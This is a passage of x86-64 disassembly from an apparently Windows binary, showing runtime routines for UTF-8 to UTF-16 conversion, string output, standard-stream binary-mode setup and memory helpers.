    6d8c1639:	48 c1 fa 06          	sar    $0x6,%rdx
    6d8c163d:	83 e2 3f             	and    $0x3f,%edx
    6d8c1640:	83 ca 80             	or     $0xffffff80,%edx
    6d8c1643:	0f be d2             	movsbl %dl,%edx
    6d8c1646:	48 89 c1             	mov    %rax,%rcx
    6d8c1649:	83 e3 3f             	and    $0x3f,%ebx
    6d8c164c:	e8 ac 29 00 00       	call   0x6d8c3ffd
    6d8c1651:	83 cb 80             	or     $0xffffff80,%ebx
    6d8c1654:	0f be d3             	movsbl %bl,%edx
    6d8c1657:	48 89 c1             	mov    %rax,%rcx
    6d8c165a:	e8 9e 29 00 00       	call   0x6d8c3ffd
    6d8c165f:	49 89 f0             	mov    %rsi,%r8
    6d8c1662:	e9 de fe ff ff       	jmp    0x6d8c1545
    6d8c1667:	48 89 da             	mov    %rbx,%rdx
    6d8c166a:	48 89 c1             	mov    %rax,%rcx
    6d8c166d:	48 c1 fa 12          	sar    $0x12,%rdx
    6d8c1671:	83 ca f0             	or     $0xfffffff0,%edx
    6d8c1674:	0f be d2             	movsbl %dl,%edx
    6d8c1677:	e8 81 29 00 00       	call   0x6d8c3ffd
    6d8c167c:	48 89 da             	mov    %rbx,%rdx
    6d8c167f:	48 c1 fa 0c          	sar    $0xc,%rdx
    6d8c1683:	83 e2 3f             	and    $0x3f,%edx
    6d8c1686:	83 ca 80             	or     $0xffffff80,%edx
    6d8c1689:	eb a0                	jmp    0x6d8c162b
    6d8c168b:	48 83 c4 28          	add    $0x28,%rsp
    6d8c168f:	5b                   	pop    %rbx
    6d8c1690:	5e                   	pop    %rsi
    6d8c1691:	5f                   	pop    %rdi
    6d8c1692:	5d                   	pop    %rbp
    6d8c1693:	41 5c                	pop    %r12
    6d8c1695:	41 5d                	pop    %r13
    6d8c1697:	c3                   	ret
    6d8c1698:	41 b8 fd ff 00 00    	mov    $0xfffd,%r8d
    6d8c169e:	ba 50 00 00 00       	mov    $0x50,%edx
    6d8c16a3:	e9 6d fe ff ff       	jmp    0x6d8c1515
    6d8c16a8:	41 54                	push   %r12
    6d8c16aa:	55                   	push   %rbp
    6d8c16ab:	57                   	push   %rdi
    6d8c16ac:	56                   	push   %rsi
    6d8c16ad:	53                   	push   %rbx
    6d8c16ae:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c16b2:	48 89 d6             	mov    %rdx,%rsi
    6d8c16b5:	48 89 cb             	mov    %rcx,%rbx
    6d8c16b8:	48 8d 52 01          	lea    0x1(%rdx),%rdx
    6d8c16bc:	48 8d 0d 7d c1 0f 00 	lea    0xfc17d(%rip),%rcx        # 0x6d9bd840
    6d8c16c3:	48 01 d2             	add    %rdx,%rdx
    6d8c16c6:	e8 8a 27 00 00       	call   0x6d8c3e55
    6d8c16cb:	48 8d 7e fd          	lea    -0x3(%rsi),%rdi
    6d8c16cf:	31 c9                	xor    %ecx,%ecx
    6d8c16d1:	45 31 c0             	xor    %r8d,%r8d
    6d8c16d4:	4c 8d 56 ff          	lea    -0x1(%rsi),%r10
    6d8c16d8:	4c 8d 5e fe          	lea    -0x2(%rsi),%r11
    6d8c16dc:	4f 8d 0c 00          	lea    (%r8,%r8,1),%r9
    6d8c16e0:	48 39 f1             	cmp    %rsi,%rcx
    6d8c16e3:	4a 8d 2c 08          	lea    (%rax,%r9,1),%rbp
    6d8c16e7:	0f 8d 55 01 00 00    	jge    0x6d8c1842
    6d8c16ed:	44 8a 24 0b          	mov    (%rbx,%rcx,1),%r12b
    6d8c16f1:	45 84 e4             	test   %r12b,%r12b
    6d8c16f4:	79 0d                	jns    0x6d8c1703
    6d8c16f6:	44 89 e2             	mov    %r12d,%edx
    6d8c16f9:	c0 ea 05             	shr    $0x5,%dl
    6d8c16fc:	80 fa 06             	cmp    $0x6,%dl
    6d8c16ff:	75 0e                	jne    0x6d8c170f
    6d8c1701:	eb 19                	jmp    0x6d8c171c
    6d8c1703:	49 0f be d4          	movsbq %r12b,%rdx
    6d8c1707:	48 ff c1             	inc    %rcx
    6d8c170a:	e9 1f 01 00 00       	jmp    0x6d8c182e
    6d8c170f:	44 89 e2             	mov    %r12d,%edx
    6d8c1712:	c0 ea 04             	shr    $0x4,%dl
    6d8c1715:	80 fa 0e             	cmp    $0xe,%dl
    6d8c1718:	75 2b                	jne    0x6d8c1745
    6d8c171a:	eb 36                	jmp    0x6d8c1752
    6d8c171c:	49 39 ca             	cmp    %rcx,%r10
    6d8c171f:	7e 6d                	jle    0x6d8c178e
    6d8c1721:	8a 54 0b 01          	mov    0x1(%rbx,%rcx,1),%dl
    6d8c1725:	48 83 c1 02          	add    $0x2,%rcx
    6d8c1729:	49 89 d1             	mov    %rdx,%r9
    6d8c172c:	4c 89 e2             	mov    %r12,%rdx
    6d8c172f:	48 c1 e2 06          	shl    $0x6,%rdx
    6d8c1733:	41 83 e1 3f          	and    $0x3f,%r9d
    6d8c1737:	81 e2 c0 07 00 00    	and    $0x7c0,%edx
    6d8c173d:	4c 09 ca             	or     %r9,%rdx
    6d8c1740:	e9 e9 00 00 00       	jmp    0x6d8c182e
    6d8c1745:	44 89 e2             	mov    %r12d,%edx
    6d8c1748:	c0 ea 03             	shr    $0x3,%dl
    6d8c174b:	80 fa 1e             	cmp    $0x1e,%dl
    6d8c174e:	75 3e                	jne    0x6d8c178e
    6d8c1750:	eb 37                	jmp    0x6d8c1789
    6d8c1752:	49 39 cb             	cmp    %rcx,%r11
    6d8c1755:	7e 37                	jle    0x6d8c178e
    6d8c1757:	8a 54 0b 02          	mov    0x2(%rbx,%rcx,1),%dl
    6d8c175b:	49 c1 e4 0c          	shl    $0xc,%r12
    6d8c175f:	44 0f b6 4c 0b 01    	movzbl 0x1(%rbx,%rcx,1),%r9d
    6d8c1765:	41 81 e4 00 f0 00 00 	and    $0xf000,%r12d
    6d8c176c:	48 83 c1 03          	add    $0x3,%rcx
    6d8c1770:	83 e2 3f             	and    $0x3f,%edx
    6d8c1773:	49 c1 e1 06          	shl    $0x6,%r9
    6d8c1777:	4c 09 e2             	or     %r12,%rdx
    6d8c177a:	41 81 e1 c0 0f 00 00 	and    $0xfc0,%r9d
    6d8c1781:	4c 09 ca             	or     %r9,%rdx
    6d8c1784:	e9 93 00 00 00       	jmp    0x6d8c181c
    6d8c1789:	48 39 cf             	cmp    %rcx,%rdi
    6d8c178c:	7f 0d                	jg     0x6d8c179b
    6d8c178e:	48 ff c1             	inc    %rcx
    6d8c1791:	ba fd ff 00 00       	mov    $0xfffd,%edx
    6d8c1796:	e9 93 00 00 00       	jmp    0x6d8c182e
    6d8c179b:	8a 54 0b 03          	mov    0x3(%rbx,%rcx,1),%dl
    6d8c179f:	49 c1 e4 12          	shl    $0x12,%r12
    6d8c17a3:	41 81 e4 00 00 1c 00 	and    $0x1c0000,%r12d
    6d8c17aa:	83 e2 3f             	and    $0x3f,%edx
    6d8c17ad:	4c 09 e2             	or     %r12,%rdx
    6d8c17b0:	44 0f b6 64 0b 01    	movzbl 0x1(%rbx,%rcx,1),%r12d
    6d8c17b6:	49 c1 e4 0c          	shl    $0xc,%r12
    6d8c17ba:	41 81 e4 00 f0 03 00 	and    $0x3f000,%r12d
    6d8c17c1:	4c 09 e2             	or     %r12,%rdx
    6d8c17c4:	44 0f b6 64 0b 02    	movzbl 0x2(%rbx,%rcx,1),%r12d
    6d8c17ca:	48 83 c1 04          	add    $0x4,%rcx
    6d8c17ce:	49 c1 e4 06          	shl    $0x6,%r12
    6d8c17d2:	41 81 e4 c0 0f 00 00 	and    $0xfc0,%r12d
    6d8c17d9:	4c 09 e2             	or     %r12,%rdx
    6d8c17dc:	48 81 fa ff ff 00 00 	cmp    $0xffff,%rdx
    6d8c17e3:	7e 37                	jle    0x6d8c181c
    6d8c17e5:	48 81 fa ff ff 10 00 	cmp    $0x10ffff,%rdx
    6d8c17ec:	7f 46                	jg     0x6d8c1834
    6d8c17ee:	48 81 ea 00 00 01 00 	sub    $0x10000,%rdx
    6d8c17f5:	49 ff c0             	inc    %r8
    6d8c17f8:	49 89 d4             	mov    %rdx,%r12
    6d8c17fb:	66 81 e2 ff 03       	and    $0x3ff,%dx
    6d8c1800:	49 c1 fc 0a          	sar    $0xa,%r12
    6d8c1804:	66 81 ea 00 24       	sub    $0x2400,%dx
    6d8c1809:	66 41 81 ec 00 28    	sub    $0x2800,%r12w
    6d8c180f:	66 44 89 65 00       	mov    %r12w,0x0(%rbp)
    6d8c1814:	66 42 89 54 08 02    	mov    %dx,0x2(%rax,%r9,1)
    6d8c181a:	eb 1e                	jmp    0x6d8c183a
    6d8c181c:	48 81 fa ff d7 00 00 	cmp    $0xd7ff,%rdx
    6d8c1823:	7e 09                	jle    0x6d8c182e
    6d8c1825:	48 81 fa ff df 00 00 	cmp    $0xdfff,%rdx
    6d8c182c:	7e 06                	jle    0x6d8c1834
    6d8c182e:	66 89 55 00          	mov    %dx,0x0(%rbp)
    6d8c1832:	eb 06                	jmp    0x6d8c183a
    6d8c1834:	66 c7 45 00 fd ff    	movw   $0xfffd,0x0(%rbp)
    6d8c183a:	49 ff c0             	inc    %r8
    6d8c183d:	e9 9a fe ff ff       	jmp    0x6d8c16dc
    6d8c1842:	66 c7 45 00 00 00    	movw   $0x0,0x0(%rbp)
    6d8c1848:	48 83 c4 20          	add    $0x20,%rsp
    6d8c184c:	5b                   	pop    %rbx
    6d8c184d:	5e                   	pop    %rsi
    6d8c184e:	5f                   	pop    %rdi
    6d8c184f:	5d                   	pop    %rbp
    6d8c1850:	41 5c                	pop    %r12
    6d8c1852:	c3                   	ret
    6d8c1853:	48 8d 05 86 08 01 00 	lea    0x10886(%rip),%rax        # 0x6d8d20e0
    6d8c185a:	31 d2                	xor    %edx,%edx
    6d8c185c:	48 85 c9             	test   %rcx,%rcx
    6d8c185f:	74 0c                	je     0x6d8c186d
    6d8c1861:	48 8b 11             	mov    (%rcx),%rdx
    6d8c1864:	48 85 d2             	test   %rdx,%rdx
    6d8c1867:	74 04                	je     0x6d8c186d
    6d8c1869:	48 8d 41 10          	lea    0x10(%rcx),%rax
    6d8c186d:	48 89 c1             	mov    %rax,%rcx
    6d8c1870:	e9 33 fe ff ff       	jmp    0x6d8c16a8
    6d8c1875:	57                   	push   %rdi
    6d8c1876:	48 85 c9             	test   %rcx,%rcx
    6d8c1879:	49 89 c8             	mov    %rcx,%r8
    6d8c187c:	74 1e                	je     0x6d8c189c
    6d8c187e:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6d8c1882:	31 c0                	xor    %eax,%eax
    6d8c1884:	4c 89 c7             	mov    %r8,%rdi
    6d8c1887:	f2 ae                	repnz scas (%rdi),%al
    6d8c1889:	48 89 ca             	mov    %rcx,%rdx
    6d8c188c:	4c 89 c1             	mov    %r8,%rcx
    6d8c188f:	48 f7 d2             	not    %rdx
    6d8c1892:	48 8d 52 ff          	lea    -0x1(%rdx),%rdx
    6d8c1896:	5f                   	pop    %rdi
    6d8c1897:	e9 0c fe ff ff       	jmp    0x6d8c16a8
    6d8c189c:	31 c0                	xor    %eax,%eax
    6d8c189e:	5f                   	pop    %rdi
    6d8c189f:	c3                   	ret
    6d8c18a0:	48 8b 05 19 6e 0f 00 	mov    0xf6e19(%rip),%rax        # 0x6d9b86c0
    6d8c18a7:	c6 05 a2 bf 0f 00 16 	movb   $0x16,0xfbfa2(%rip)        # 0x6d9bd850
    6d8c18ae:	48 c7 05 c7 bf 0f 00 	movq   $0x2,0xfbfc7(%rip)        # 0x6d9bd880
    6d8c18b5:	02 00 00 00 
    6d8c18b9:	48 c7 05 c4 bf 0f 00 	movq   $0x2,0xfbfc4(%rip)        # 0x6d9bd888
    6d8c18c0:	02 00 00 00 
    6d8c18c4:	66 c7 05 c3 bf 0f 00 	movw   $0x331,0xfbfc3(%rip)        # 0x6d9bd890
    6d8c18cb:	31 03 
    6d8c18cd:	48 89 05 c4 bf 0f 00 	mov    %rax,0xfbfc4(%rip)        # 0x6d9bd898
    6d8c18d4:	48 8d 05 a5 bf 0f 00 	lea    0xfbfa5(%rip),%rax        # 0x6d9bd880
    6d8c18db:	48 89 05 76 bf 0f 00 	mov    %rax,0xfbf76(%rip)        # 0x6d9bd858
    6d8c18e2:	48 8d 05 27 fc ff ff 	lea    -0x3d9(%rip),%rax        # 0x6d8c1510
    6d8c18e9:	48 c7 05 4c bf 0f 00 	movq   $0x8,0xfbf4c(%rip)        # 0x6d9bd840
    6d8c18f0:	08 00 00 00 
    6d8c18f4:	48 c7 05 49 bf 0f 00 	movq   $0x8,0xfbf49(%rip)        # 0x6d9bd848
    6d8c18fb:	08 00 00 00 
    6d8c18ff:	48 89 05 6a bf 0f 00 	mov    %rax,0xfbf6a(%rip)        # 0x6d9bd870
    6d8c1906:	c3                   	ret
    6d8c1907:	90                   	nop
    6d8c1908:	90                   	nop
    6d8c1909:	90                   	nop
    6d8c190a:	90                   	nop
    6d8c190b:	90                   	nop
    6d8c190c:	90                   	nop
    6d8c190d:	90                   	nop
    6d8c190e:	90                   	nop
    6d8c190f:	90                   	nop
    6d8c1910:	57                   	push   %rdi
    6d8c1911:	56                   	push   %rsi
    6d8c1912:	53                   	push   %rbx
    6d8c1913:	48 83 ec 30          	sub    $0x30,%rsp
    6d8c1917:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c191c:	48 89 cf             	mov    %rcx,%rdi
    6d8c191f:	48 8b 0d ea 6d 0f 00 	mov    0xf6dea(%rip),%rcx        # 0x6d9b8710
    6d8c1926:	e8 2a 25 00 00       	call   0x6d8c3e55
    6d8c192b:	48 89 f9             	mov    %rdi,%rcx
    6d8c192e:	48 89 c3             	mov    %rax,%rbx
    6d8c1931:	48 8b 05 a8 6d 0f 00 	mov    0xf6da8(%rip),%rax        # 0x6d9b86e0
    6d8c1938:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    6d8c193c:	48 89 03             	mov    %rax,(%rbx)
    6d8c193f:	48 8d 05 ba 07 01 00 	lea    0x107ba(%rip),%rax        # 0x6d8d2100
    6d8c1946:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c194a:	e8 81 25 00 00       	call   0x6d8c3ed0
    6d8c194f:	48 85 f6             	test   %rsi,%rsi
    6d8c1952:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6d8c1956:	74 26                	je     0x6d8c197e
    6d8c1958:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
    6d8c195c:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
    6d8c1960:	48 83 e8 08          	sub    $0x8,%rax
    6d8c1964:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c1968:	48 89 46 f0          	mov    %rax,-0x10(%rsi)
    6d8c196c:	77 10                	ja     0x6d8c197e
    6d8c196e:	48 8b 0d 1b 6f 0f 00 	mov    0xf6f1b(%rip),%rcx        # 0x6d9b8890
    6d8c1975:	48 83 c1 18          	add    $0x18,%rcx
    6d8c1979:	e8 ed 13 00 00       	call   0x6d8c2d6b
    6d8c197e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    6d8c1982:	48 85 c9             	test   %rcx,%rcx
    6d8c1985:	74 26                	je     0x6d8c19ad
    6d8c1987:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    6d8c198b:	48 8d 51 f0          	lea    -0x10(%rcx),%rdx
    6d8c198f:	48 83 e8 08          	sub    $0x8,%rax
    6d8c1993:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c1997:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
    6d8c199b:	77 10                	ja     0x6d8c19ad
    6d8c199d:	48 8b 0d ec 6e 0f 00 	mov    0xf6eec(%rip),%rcx        # 0x6d9b8890
    6d8c19a4:	48 83 c1 18          	add    $0x18,%rcx
    6d8c19a8:	e8 be 13 00 00       	call   0x6d8c2d6b
    6d8c19ad:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
    6d8c19b4:	00 
    6d8c19b5:	4c 8d 0d 4c 07 01 00 	lea    0x1074c(%rip),%r9        # 0x6d8d2108
    6d8c19bc:	48 89 d9             	mov    %rbx,%rcx
    6d8c19bf:	48 c7 44 24 20 8b 00 	movq   $0x8b,0x20(%rsp)
    6d8c19c6:	00 00 
    6d8c19c8:	4c 8d 05 40 07 01 00 	lea    0x10740(%rip),%r8        # 0x6d8d210f
    6d8c19cf:	48 8d 15 2a 07 01 00 	lea    0x1072a(%rip),%rdx        # 0x6d8d2100
    6d8c19d6:	e8 1c 2d 00 00       	call   0x6d8c46f7
    6d8c19db:	90                   	nop
    6d8c19dc:	41 54                	push   %r12
    6d8c19de:	55                   	push   %rbp
    6d8c19df:	57                   	push   %rdi
    6d8c19e0:	56                   	push   %rsi
    6d8c19e1:	53                   	push   %rbx
    6d8c19e2:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c19e6:	48 85 d2             	test   %rdx,%rdx
    6d8c19e9:	44 89 c5             	mov    %r8d,%ebp
    6d8c19ec:	48 89 cf             	mov    %rcx,%rdi
    6d8c19ef:	4c 8d 05 22 07 01 00 	lea    0x10722(%rip),%r8        # 0x6d8d2118
    6d8c19f6:	48 89 d3             	mov    %rdx,%rbx
    6d8c19f9:	74 0a                	je     0x6d8c1a05
    6d8c19fb:	48 83 3a 00          	cmpq   $0x0,(%rdx)
    6d8c19ff:	74 04                	je     0x6d8c1a05
    6d8c1a01:	4c 8d 42 10          	lea    0x10(%rdx),%r8
    6d8c1a05:	48 8d 15 0d 07 01 00 	lea    0x1070d(%rip),%rdx        # 0x6d8d2119
    6d8c1a0c:	48 89 f9             	mov    %rdi,%rcx
    6d8c1a0f:	e8 64 cb 00 00       	call   0x6d8ce578
    6d8c1a14:	4c 8d 25 fe 06 01 00 	lea    0x106fe(%rip),%r12        # 0x6d8d2119
    6d8c1a1b:	89 c6                	mov    %eax,%esi
    6d8c1a1d:	31 d2                	xor    %edx,%edx
    6d8c1a1f:	48 85 db             	test   %rbx,%rbx
    6d8c1a22:	48 63 c6             	movslq %esi,%rax
    6d8c1a25:	74 03                	je     0x6d8c1a2a
    6d8c1a27:	48 8b 13             	mov    (%rbx),%rdx
    6d8c1a2a:	48 39 d0             	cmp    %rdx,%rax
    6d8c1a2d:	7d 44                	jge    0x6d8c1a73
    6d8c1a2f:	80 7c 03 10 00       	cmpb   $0x0,0x10(%rbx,%rax,1)
    6d8c1a34:	74 16                	je     0x6d8c1a4c
    6d8c1a36:	4c 8d 44 03 10       	lea    0x10(%rbx,%rax,1),%r8
    6d8c1a3b:	4c 89 e2             	mov    %r12,%rdx
    6d8c1a3e:	48 89 f9             	mov    %rdi,%rcx
    6d8c1a41:	e8 32 cb 00 00       	call   0x6d8ce578
    6d8c1a46:	85 c0                	test   %eax,%eax
    6d8c1a48:	7f 25                	jg     0x6d8c1a6f
    6d8c1a4a:	eb 12                	jmp    0x6d8c1a5e
    6d8c1a4c:	31 c9                	xor    %ecx,%ecx
    6d8c1a4e:	48 89 fa             	mov    %rdi,%rdx
    6d8c1a51:	e8 1a cb 00 00       	call   0x6d8ce570
    6d8c1a56:	85 c0                	test   %eax,%eax
    6d8c1a58:	75 04                	jne    0x6d8c1a5e
    6d8c1a5a:	ff c6                	inc    %esi
    6d8c1a5c:	eb bf                	jmp    0x6d8c1a1d
    6d8c1a5e:	40 84 ed             	test   %bpl,%bpl
    6d8c1a61:	74 10                	je     0x6d8c1a73
    6d8c1a63:	48 8d 0d b6 06 01 00 	lea    0x106b6(%rip),%rcx        # 0x6d8d2120
    6d8c1a6a:	e8 a1 fe ff ff       	call   0x6d8c1910
    6d8c1a6f:	01 c6                	add    %eax,%esi
    6d8c1a71:	eb aa                	jmp    0x6d8c1a1d
    6d8c1a73:	48 83 c4 20          	add    $0x20,%rsp
    6d8c1a77:	5b                   	pop    %rbx
    6d8c1a78:	5e                   	pop    %rsi
    6d8c1a79:	5f                   	pop    %rdi
    6d8c1a7a:	5d                   	pop    %rbp
    6d8c1a7b:	41 5c                	pop    %r12
    6d8c1a7d:	c3                   	ret
    6d8c1a7e:	41 54                	push   %r12
    6d8c1a80:	55                   	push   %rbp
    6d8c1a81:	57                   	push   %rdi
    6d8c1a82:	56                   	push   %rsi
    6d8c1a83:	53                   	push   %rbx
    6d8c1a84:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c1a88:	48 8b 35 a1 f5 00 00 	mov    0xf5a1(%rip),%rsi        # 0x6d8d1030
    6d8c1a8f:	31 db                	xor    %ebx,%ebx
    6d8c1a91:	48 89 cd             	mov    %rcx,%rbp
    6d8c1a94:	49 89 d4             	mov    %rdx,%r12
    6d8c1a97:	4c 39 e3             	cmp    %r12,%rbx
    6d8c1a9a:	7c 3a                	jl     0x6d8c1ad6
    6d8c1a9c:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c1aa1:	ff d6                	call   *%rsi
    6d8c1aa3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    6d8c1aa9:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c1aae:	48 8d 0d 67 06 01 00 	lea    0x10667(%rip),%rcx        # 0x6d8d211c
    6d8c1ab5:	49 89 c1             	mov    %rax,%r9
    6d8c1ab8:	e8 a3 ca 00 00       	call   0x6d8ce560
    6d8c1abd:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c1ac2:	ff d6                	call   *%rsi
    6d8c1ac4:	48 89 c1             	mov    %rax,%rcx
    6d8c1ac7:	48 83 c4 20          	add    $0x20,%rsp
    6d8c1acb:	5b                   	pop    %rbx
    6d8c1acc:	5e                   	pop    %rsi
    6d8c1acd:	5f                   	pop    %rdi
    6d8c1ace:	5d                   	pop    %rbp
    6d8c1acf:	41 5c                	pop    %r12
    6d8c1ad1:	e9 aa ca 00 00       	jmp    0x6d8ce580
    6d8c1ad6:	48 8b 7c dd 00       	mov    0x0(%rbp,%rbx,8),%rdi
    6d8c1adb:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c1ae0:	48 ff c3             	inc    %rbx
    6d8c1ae3:	ff d6                	call   *%rsi
    6d8c1ae5:	45 31 c0             	xor    %r8d,%r8d
    6d8c1ae8:	48 89 c1             	mov    %rax,%rcx
    6d8c1aeb:	48 89 fa             	mov    %rdi,%rdx
    6d8c1aee:	e8 e9 fe ff ff       	call   0x6d8c19dc
    6d8c1af3:	eb a2                	jmp    0x6d8c1a97
    6d8c1af5:	57                   	push   %rdi
    6d8c1af6:	56                   	push   %rsi
    6d8c1af7:	53                   	push   %rbx
    6d8c1af8:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c1afc:	48 8b 3d 2d f5 00 00 	mov    0xf52d(%rip),%rdi        # 0x6d8d1030
    6d8c1b03:	31 c9                	xor    %ecx,%ecx
    6d8c1b05:	ff d7                	call   *%rdi
    6d8c1b07:	48 8b 35 c6 f7 10 00 	mov    0x10f7c6(%rip),%rsi        # 0x6d9d12d4
    6d8c1b0e:	48 89 c1             	mov    %rax,%rcx
    6d8c1b11:	ff d6                	call   *%rsi
    6d8c1b13:	ba 00 80 00 00       	mov    $0x8000,%edx
    6d8c1b18:	48 8b 1d d5 f7 10 00 	mov    0x10f7d5(%rip),%rbx        # 0x6d9d12f4
    6d8c1b1f:	89 c1                	mov    %eax,%ecx
    6d8c1b21:	ff d3                	call   *%rbx
    6d8c1b23:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c1b28:	ff d7                	call   *%rdi
    6d8c1b2a:	48 89 c1             	mov    %rax,%rcx
    6d8c1b2d:	ff d6                	call   *%rsi
    6d8c1b2f:	ba 00 80 00 00       	mov    $0x8000,%edx
    6d8c1b34:	89 c1                	mov    %eax,%ecx
    6d8c1b36:	ff d3                	call   *%rbx
    6d8c1b38:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c1b3d:	ff d7                	call   *%rdi
    6d8c1b3f:	48 89 c1             	mov    %rax,%rcx
    6d8c1b42:	ff d6                	call   *%rsi
    6d8c1b44:	ba 00 80 00 00       	mov    $0x8000,%edx
    6d8c1b49:	89 c1                	mov    %eax,%ecx
    6d8c1b4b:	48 89 d8             	mov    %rbx,%rax
    6d8c1b4e:	48 83 c4 20          	add    $0x20,%rsp
    6d8c1b52:	5b                   	pop    %rbx
    6d8c1b53:	5e                   	pop    %rsi
    6d8c1b54:	5f                   	pop    %rdi
    6d8c1b55:	48 ff e0             	rex.W jmp *%rax
    6d8c1b58:	48 c7 05 75 bd 0f 00 	movq   $0x0,0xfbd75(%rip)        # 0x6d9bd8d8
    6d8c1b5f:	00 00 00 00 
    6d8c1b63:	48 c7 05 52 bd 0f 00 	movq   $0x4,0xfbd52(%rip)        # 0x6d9bd8c0
    6d8c1b6a:	04 00 00 00 
    6d8c1b6e:	48 c7 05 4f bd 0f 00 	movq   $0x4,0xfbd4f(%rip)        # 0x6d9bd8c8
    6d8c1b75:	04 00 00 00 
    6d8c1b79:	66 c7 05 4e bd 0f 00 	movw   $0x322,0xfbd4e(%rip)        # 0x6d9bd8d0
    6d8c1b80:	22 03 
    6d8c1b82:	c3                   	ret
    6d8c1b83:	90                   	nop
    6d8c1b84:	90                   	nop
    6d8c1b85:	90                   	nop
    6d8c1b86:	90                   	nop
    6d8c1b87:	90                   	nop
    6d8c1b88:	90                   	nop
    6d8c1b89:	90                   	nop
    6d8c1b8a:	90                   	nop
    6d8c1b8b:	90                   	nop
    6d8c1b8c:	90                   	nop
    6d8c1b8d:	90                   	nop
    6d8c1b8e:	90                   	nop
    6d8c1b8f:	90                   	nop
    6d8c1b90:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
    6d8c1b96:	89 c8                	mov    %ecx,%eax
    6d8c1b98:	76 13                	jbe    0x6d8c1bad
    6d8c1b9a:	81 f9 00 00 00 01    	cmp    $0x1000000,%ecx
    6d8c1ba0:	48 19 c9             	sbb    %rcx,%rcx
    6d8c1ba3:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
    6d8c1ba7:	48 83 c1 18          	add    $0x18,%rcx
    6d8c1bab:	eb 0f                	jmp    0x6d8c1bbc
    6d8c1bad:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
    6d8c1bb3:	48 19 c9             	sbb    %rcx,%rcx
    6d8c1bb6:	48 f7 d1             	not    %rcx
    6d8c1bb9:	83 e1 08             	and    $0x8,%ecx
    6d8c1bbc:	48 8d 15 3d 09 01 00 	lea    0x1093d(%rip),%rdx        # 0x6d8d2500
    6d8c1bc3:	d3 e8                	shr    %cl,%eax
    6d8c1bc5:	48 0f be 04 02       	movsbq (%rdx,%rax,1),%rax
    6d8c1bca:	48 01 c8             	add    %rcx,%rax
    6d8c1bcd:	c3                   	ret
    6d8c1bce:	c3                   	ret
    6d8c1bcf:	b8 04 00 00 00       	mov    $0x4,%eax
    6d8c1bd4:	48 85 c9             	test   %rcx,%rcx
    6d8c1bd7:	74 16                	je     0x6d8c1bef
    6d8c1bd9:	48 8d 04 49          	lea    (%rcx,%rcx,2),%rax
    6d8c1bdd:	48 8d 14 09          	lea    (%rcx,%rcx,1),%rdx
    6d8c1be1:	48 d1 f8             	sar    $1,%rax
    6d8c1be4:	48 81 f9 ff ff 00 00 	cmp    $0xffff,%rcx
    6d8c1beb:	48 0f 4e c2          	cmovle %rdx,%rax
    6d8c1bef:	c3                   	ret
    6d8c1bf0:	48 8d 05 69 05 01 00 	lea    0x10569(%rip),%rax        # 0x6d8d2160
    6d8c1bf7:	48 85 c9             	test   %rcx,%rcx
    6d8c1bfa:	74 0a                	je     0x6d8c1c06
    6d8c1bfc:	48 83 39 00          	cmpq   $0x0,(%rcx)
    6d8c1c00:	74 04                	je     0x6d8c1c06
    6d8c1c02:	48 8d 41 10          	lea    0x10(%rcx),%rax
    6d8c1c06:	c3                   	ret
    6d8c1c07:	57                   	push   %rdi
    6d8c1c08:	53                   	push   %rbx
    6d8c1c09:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c1c0d:	45 31 c0             	xor    %r8d,%r8d
    6d8c1c10:	48 85 d2             	test   %rdx,%rdx
    6d8c1c13:	48 89 cb             	mov    %rcx,%rbx
    6d8c1c16:	49 89 d2             	mov    %rdx,%r10
    6d8c1c19:	74 15                	je     0x6d8c1c30
    6d8c1c1b:	48 89 d7             	mov    %rdx,%rdi
    6d8c1c1e:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6d8c1c22:	31 c0                	xor    %eax,%eax
    6d8c1c24:	f2 ae                	repnz scas (%rdi),%al
    6d8c1c26:	48 89 ca             	mov    %rcx,%rdx
    6d8c1c29:	48 f7 d2             	not    %rdx
    6d8c1c2c:	4c 8d 42 ff          	lea    -0x1(%rdx),%r8
    6d8c1c30:	4c 89 d1             	mov    %r10,%rcx
    6d8c1c33:	49 89 d9             	mov    %rbx,%r9
    6d8c1c36:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c1c3b:	e8 20 c9 00 00       	call   0x6d8ce560
    6d8c1c40:	48 89 d9             	mov    %rbx,%rcx
    6d8c1c43:	48 83 c4 28          	add    $0x28,%rsp
    6d8c1c47:	5b                   	pop    %rbx
    6d8c1c48:	5f                   	pop    %rdi
    6d8c1c49:	e9 32 c9 00 00       	jmp    0x6d8ce580
    6d8c1c4e:	57                   	push   %rdi
    6d8c1c4f:	31 c0                	xor    %eax,%eax
    6d8c1c51:	49 89 c8             	mov    %rcx,%r8
    6d8c1c54:	48 89 d1             	mov    %rdx,%rcx
    6d8c1c57:	4c 89 c7             	mov    %r8,%rdi
    6d8c1c5a:	f3 aa                	rep stos %al,(%rdi)
    6d8c1c5c:	5f                   	pop    %rdi
    6d8c1c5d:	c3                   	ret
    6d8c1c5e:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c1c62:	49 89 ca             	mov    %rcx,%r10
